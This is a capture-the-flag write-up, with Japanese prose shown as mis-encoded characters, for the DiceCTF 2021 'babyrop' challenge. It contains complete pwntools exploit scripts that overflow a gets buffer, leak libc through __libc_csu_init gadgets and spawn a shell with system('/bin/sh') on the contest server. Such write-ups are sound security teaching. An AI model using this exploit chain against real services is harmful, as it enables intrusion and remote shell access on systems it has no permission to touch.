---
title: "DiceCTF 2021 - babyrop"
emoji: "ğŸ¤–"
type: "tech" # tech: æŠ€è¡“è¨˜äº‹ / idea: ã‚¢ã‚¤ãƒ‡ã‚¢
topics: ["CTF", "Pwn", "Easy"]
published: true
---

## å•é¡Œæ¦‚è¦
> "FizzBuzz101: Who wants to write a ret2libc"
> `nc dicec.tf 31924`
> Downloads
> [babyrop](https://dicegang.storage.googleapis.com/uploads/81a058cd979b5dbecfd4e34d34dc60b0badca42b646d0ce7bc5ac1f0b50ed599/babyrop)

`nc`ã‚³ãƒãƒ³ãƒ‰ã§ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã¿ã‚‹ã¨ã€`Your name:`ã¨å…¥åŠ›ã‚’æ±‚ã‚ã‚‰ã‚Œã‚‹ã ã‘ã®ã‚·ãƒ³ãƒ—ãƒ«ãªãƒ—ãƒ­ã‚°ãƒ©ãƒ ã§ã™ã€‚

## è§£èª¬
### æ¦‚è¦æŠŠæ¡
å–ã‚Šæ•¢ãˆãšåˆæ‰‹ç„¡æ€è€ƒchecksecã€‚

```bash
$ checksec --file=./babyrop
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   68 Symbols     No       0      ./babyrop
```

Partial RELRO/No Canary/No PIEã§ã™ã€‚ã‚·ãƒ³ãƒ—ãƒ«ã«ret2libcã‚’ã™ã‚Œã°ã‚ˆã•ãã†ã§ã™ã€‚

é©å½“ãªãƒ„ãƒ¼ãƒ«ï¼ˆä»Šå›ã¯ghidraï¼‰ã§å¯è¦–åŒ–ã—ã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®æŠŠæ¡ã‚’è¡Œã„ã¾ã™ã€‚

- 64bit
- å…¥åŠ›ã¯é•·ã•`0x40`ã®ç®‡æ‰€ã«ä»»æ„é•·èª­ã¿è¾¼ã¿ã®gets(ã¤ã¾ã‚Špaddingã¯é•·ã•0x48)

ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ©Ÿæ§‹ã¯ã‚ã¾ã‚Šè€ƒãˆãªãã¦ã‚‚ã‚ˆã„ï¼ˆãã‚‰ã„ã«ä½•ã‚‚ãªã„ï¼‰ã®ã§å¿…è¦ãªæµã‚Œã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ã€‚

1. libcå†…ã®`write`é–¢æ•°ã®ä½ç½®ã‚’å–å¾—ã™ã‚‹
2. [libc database search](https://libc.blukat.me/)ã‚’ç”¨ã„ã¦libcã®ç‰¹å®šã€libc base addrã®ç‰¹å®šã‚’è¡Œã„ã€`system("/bin/sh")`ã«å¿…è¦ãª`system`ã¨`"/bin/sh"`ã®ä½ç½®ã‚’èª¿ã¹ã‚‹
3. payloadã‚’æŠ•ã’ã‚‹

### libc leak
`write`é–¢æ•°ã¯å¼•æ•°ã‚’3ã¤å–ã‚Šã¾ã™ã€‚ãã®ãŸã‚ã€`rdi`ã€`rsi`ã€`rdx`ã®3ã¤ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã«ä»»æ„ã®å€¤ã‚’å…¥ã‚Œã‚‰ã‚Œã‚‹ã“ã¨ãŒæ±‚ã‚ã‚‰ã‚Œã¾ã™ãŒã€ä½¿ãˆãã†ãªrop gadgetã«ã¤ã„ã¦rp++ã‚’åˆ©ç”¨ã—ã¦æ¤œç´¢ã™ã‚‹ã¨ã€

```
0x004011d3: pop rdi ; ret  ;  (1 found)
0x004011d1: pop rsi ; pop r15 ; ret  ;  (1 found)
```

ã¨`rdi`ã€`rsi`ã«ã¤ã„ã¦ã¯è¦‹ã¤ã‹ã‚Šã¾ã™ã€‚ãŒã€`rdx`ãŒã‚ã‚Šã¾ã›ã‚“ã€‚ã”ãæ™®é€šã®ropã¯é›£ã—ãã†ã§ã™ã€‚ã¨ã“ã‚ã§ã€é–¢æ•°ã®å¼•æ•°ãŒ3ã¤ã®å ´åˆã«ãŠã„ã¦ã¯`__libc_csu_init`ã‚’ç”¨ã„ãŸæ”»æ’ƒãŒæœ‰åŠ¹ã§ã‚ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚è©³ã—ãã¯[ã‚‚ã‚‚ãƒ†ã‚¯ã®è¨˜äº‹](http://inaz2.hatenablog.com/entry/2014/07/31/010158)ã«ã‚ã‚Šã¾ã™ãŒã€

1. `__libc_csu_init`ã®é©åˆ‡ãªç®‡æ‰€ã«é£›ã‚“ã§ã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰ãƒ¬ã‚¸ã‚¹ã‚¿ãƒ¼ã®å€¤ã‚’åŸ‹ã‚ã‚‹
2. åŒã˜é–¢æ•°å†…ã®1ã®å°‘ã—ä¸Šã®éƒ¨åˆ†ã«ã‚‚ã†ä¸€åº¦é£›ã‚“ã§é–¢æ•°å‘¼ã³å‡ºã—ã‚’ã™ã‚‹
3. è‡ªç„¶ã¨1ã«æˆ»ã‚‹ã®ã§ä»»æ„å›3å¼•æ•°ã®é–¢æ•°ã‚’è‡ªç”±ã«ã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰å‘¼ã³å‡ºã›ã‚‹

ã¨ã„ã†ã‚‚ã®ã§ã™ã€‚è¦šãˆã¦ãŠã„ã¦æã¯ç„¡ã„ã‹ã¨ã€‚

ã¨ã„ã†ã“ã¨ã§ã€`write@GLIBC`ã‚’å‡ºåŠ›ã—ã¦ã‚‚ã‚‰ã†ãŸã‚ã®ã‚³ãƒ¼ãƒ‰ãŒã“ã¡ã‚‰ã€‚

```python:leak.py
from pwn import *

e = ELF("./babyrop")
rop = ROP(e)
rop.raw(0)

rop = ROP(e)

payload = b"A" * (0x40 + 8)
payload += p64(0x4011ca) # __libc_csu_init + 90 : pop rbx
payload += p64(0) # rbx = 0
payload += p64(1) # rbp = 1 (for no loop)
payload += p64(1) # r12 (stdout)
payload += p64(e.got["gets"]) # r13 (for leak addr)
payload += p64(8) # r14 (output bytes)
payload += p64(e.got["write"]) # r15 (call addr)
payload += p64(0x4011b0) # __libc_csu_init + 64 : mov rdx, r14

io = remote("dicec.tf", 31924)
# io = process(["./babyrop"])
print(io.recvuntil("Your name: ") + payload)
io.sendline(payload)

print(io.recv(8))
io.interactive()
```

leakã—ã¦å‡ºã¦ããŸã‚¢ãƒ‰ãƒ¬ã‚¹`0x00007f47d9a091d0`ã¨ã„ã†ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’[libc database search](https://libc.blukat.me/)ã§æ¤œç´¢ã—ã¾ã™ã€‚

å€™è£œã¨ã—ã¦3ã¤ç¨‹å‡ºã¦ããŸã®ã§ã™ãŒã€`gets`é–¢æ•°ã«ã¤ã„ã¦ã‚‚ã‚¢ãƒ‰ãƒ¬ã‚¹ã®çµã‚Šè¾¼ã¿ã‚’è¡Œã£ãŸã‚Šã€ç·å½“ãŸã‚Šã§è©¦ã™ã“ã¨ã§`libc6_2.31-0ubuntu9.1_amd64.so`ã£ã½ã„ã§ã™ã€‚ã“ã“ã¾ã§åˆ†ã‹ã£ãŸã‚‰`[leakã—ãŸwrite@GOTã®ã‚¢ãƒ‰ãƒ¬ã‚¹]-[libcå†…ã«ãŠã‘ã‚‹writeã®ã‚ªãƒ•ã‚»ãƒƒãƒˆ]`ã‚’è¨ˆç®—ã™ã‚‹ã“ã¨ã§libc base addrãŒè¨ˆç®—ã§ãã¾ã™ã€‚

### ret2libcã‚’ã™ã‚‹
ã“ã®æ™‚ç‚¹ã§

- libc base addr
- libcå†…ã®`system`é–¢æ•°ã®ä½ç½®
- libcå†…ã®`"/bin/sh"`ã®ä½ç½®

ãŒåˆ†ã‹ã£ã¦ã„ã¾ã™ã€‚ãã®ãŸã‚ã€ä¸Šã®payloadã«åŠ ãˆã¦`system("/bin/sh")`ã‚’å®Ÿè¡Œã™ã‚‹ROPã‚’ã™ã‚Œã°OKã§ã™ã€‚ä»Šå›ã¯

1. `write@GOT`ã®ãƒªãƒ¼ã‚¯ã€libc base addrã®ç®—å‡º
2. ã‚‚ã†ä¸€åº¦`main`ã«æˆ»ã£ã¦`gets`ã‚’å‘¼ã³å‡ºã—
3. `system("/bin/sh")`ã®å®Ÿè¡Œ

ã¨ã„ã†3æ®µã«åˆ†ã‘ã¾ã—ãŸã€‚

```python:solve.py
from pwn import *

e = ELF("./babyrop")
libc = ELF("./libc6_2.31-0ubuntu9.1_amd64.so")

payload = b''.join([b"A" * (0x40 + 8),
    p64(0x4011c6), # __libc_csu_init + 86 : add rsp, 0x8
    p64(0), # anything may be ok
    p64(0), # rbx = 0
    p64(1), # rbp = 1 (for no loop)
    p64(1), # r12 (edi as stdout)
    p64(e.got["write"]), # r13 (for leak addr)
    p64(8), # r14 (output bytes)
    p64(e.got["write"]), # r15 (call addr)
    p64(0x4011b0), # __libc_csu_init + 64 : mov rdx, r14
    b"deadbeef" * 7, # anything will do
    p64(e.symbols["main"]) # repeat main process
])

io = remote("dicec.tf", 31924)
# io = process(["./babyrop"])
io.recvuntil("Your name: ")
io.sendline(payload)

libc.address = (u64(io.recv(8)) - libc.symbols["write"])
print("libc base is:", hex(libc.address))

payload = b"".join([b"A" * 0x48,
    p64(0x4011d3), # pop rdi; ret
    p64(next(libc.search(b"/bin/sh"))),
    p64(libc.symbols["system"])
])

io.recvuntil("Your name: ")
io.sendline(payload)

io.interactive()
```

2å›ç›®ã®payloadã¯éå¸¸ã«ã‚·ãƒ³ãƒ—ãƒ«ãªã®ã§ã™ãŒã€1å›ç›®ã®payloadã¯å…ˆç¨‹ã®ã‚³ãƒ¼ãƒ‰ã‹ã‚‰è‹¥å¹²å¼„ã£ã¦ã„ã¾ã™ã€‚`0x4011ca`ã‹ã‚‰`0x4011c6`ã«é£›ã¶å ´æ‰€ã‚’1å‘½ä»¤åˆ†å¤‰ãˆã¦ã„ã‚‹ã®ã§ã™ãŒã€ã“ã‚ŒãŒç„¡ã„ã¨2å›ç›®ã®ROPãŒä¸Šæ‰‹ãå‹•ä½œã—ã¦ã„ãªã„ã‚ˆã†ã§ã™ã€‚ãƒ­ãƒ¼ã‚«ãƒ«ã§å‹•ã‹ã—ã¦åŸå› æŠŠæ¡ã™ã‚‹ã®ã¯å®¿é¡Œã«ã•ã›ã¦ãã ã•ã„ã€‚
